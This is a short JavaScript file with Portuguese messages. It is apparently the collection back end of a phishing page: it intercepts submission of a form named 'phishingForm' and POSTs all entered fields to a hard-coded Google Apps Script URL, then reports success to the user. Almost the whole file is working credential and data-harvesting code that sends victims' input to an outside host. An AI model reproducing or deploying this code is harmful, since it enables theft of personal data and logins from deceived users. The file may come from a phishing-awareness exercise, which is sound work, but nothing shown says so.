const scriptURL = "https://script.google.com/macros/s/AKfycbwJ-98hwx0Ll6gCUgw3metmTXwgxt0XPwZ-LTSpfCFPLOZgMnlCAlf8IHbjvZxSq8tLgg/exec";

document.getElementById("phishingForm").addEventListener("submit", function(event) {
    event.preventDefault();
    const form = event.target;
    const data = new FormData(form);

    fetch(scriptURL, {
        method: "POST",
        body: data
    })
    .then(response => {
        alert("✅ Dados enviados com sucesso!");
        form.reset();
    })
    .catch(error => {
        alert("❌ Erro ao enviar os dados.");
        console.error("Erro:", error);
    });
});
